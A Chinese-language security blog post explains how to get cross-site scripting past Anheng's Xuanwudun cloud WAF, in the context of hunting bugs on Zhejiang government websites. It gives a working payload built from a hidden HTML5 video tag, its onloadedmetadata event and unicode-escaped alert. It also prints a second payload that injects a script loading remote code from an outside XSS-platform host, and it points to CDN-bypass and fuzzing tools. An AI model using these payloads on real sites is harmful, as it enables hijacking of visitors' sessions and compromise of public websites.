---
title: XSS bypass 安恒玄武盾
categories: WEB
tags:
  - XSS
  - bypass
abbrlink: 44024
date: 2019-06-10 16:28:05
---

## 起因

这个方法是去年实验室里的小伙伴发现的，而payload构造思路则来自[XSS挑战第一期Writeup](<http://www.anquan.us/static/drops/papers-894.html>)和[XSS挑战第二期Writeup](<http://www.anquan.us/static/drops/papers-938.html>).

主要是实验室有任务寻找省内政府网站漏洞,而浙江政府又与安恒有不少合作,很多网上都挂着安恒的玄武盾云WAF.

绕云waf简单的方式就是绕过cdn,找真实ip.绕cdn方法还是很多了,也有一些工具,比如我在[另一篇文章](<https://m09ic.top/posts/48529/>)收集的[fuckcdn](<https://github.com/Tai7sy/fuckcdn>)

有些时候绕不过去cdn,又存在xss漏洞.报告里要是不能验证漏洞就等于没有漏洞,那就只能硬怼玄武盾了.

漏洞已报告给安恒,但超过两个月没得到回复,那就当做厂商不承认该漏洞.

## 细节

###  测试

最近手里没网站测试了,很多东西只能靠口诉了.

先上最终payload,payload不唯一,可以有无限多种变形.

```
6666666"> <video hidden="hidden" onloadedmetadata="\u006aava\u0073cript:[1].find(\u0061lert)" src="http://www.runoob.com/try/demo_source/movie.mp4 " ></video>
```

大佬们应该一眼就看出来问题了.

最晚在今年4月份测试依旧有效..

这是玄武盾拦截的截图:

![1](1.png)

如果payload中存在`onerror=,onload=`这些事件,`<img>,<script>`这些标签或者`alert,javascript`这些敏感词,就会弹出玄武盾.

关键字过滤的还是挺全的,除了html5的新标签和新事件.

直接fuzz一下就可以发现,比如`<video>,<canvas`这些html5标签不会触发玄武盾.

html5可用标签还挺多的,如果找不到可以用我收集的[字典](<https://github.com/M09Ic/mywordlist/blob/master/html_tags.txt>).

最容易容易构造xss的标签比如`video`.

既然html5标签都没过滤,那么html5的事件99%也不会过滤.直接fuzz全部html事件.[字典在这](<https://github.com/M09Ic/mywordlist/blob/master/html_event.txt>)

很快就找到了比如:`onloadedmetadata`,不需要额外的交互,视频加载时触发,视频又是自动加载,等于打开网站即可触发.

记得把video标签加上hidden属性.不然动静太大了.

当然不仅仅`video`标签的`onloadedmetadata`事件可用,随便组合一下就有很多其他的方法.

###  绕过

虽然绕过了关键字检测,但是如果直接用`alert()`还是会触发玄武盾.

这里就需要一个2014年乌云大佬们演示过的方法了.

通过数组实例的`find()`方法,用于找出第一个符合条件的数组成员.

`find()`的参数是一个回调函数.验证漏洞用`alert`即可.

当然`alert`关键字已经被过滤了,但是这里输入点是在js代码里面,浏览器遇到js代码会调用js解释器,所以将`alert` js编码为`\u0061lert`.稍微降低下payload长度,所以只编码一个字符就可以了.

最终事件内payload为:

`find(\u0061lert)`

###  执行

发送payload:

![2](2.png)

成功执行,绕过玄武盾.

当然不能仅仅是弹窗,完整的执行任意js代码的payload类似:

```
[1].find(function(){with(`docom'|e|'nt`);;body.appendChild(createElement('script')).src='http://xss.tt/XA'})
```

在最开头的两篇文章中偷来的,手动滑稽.

中间如果有被过滤的关键字,js编码下即可.









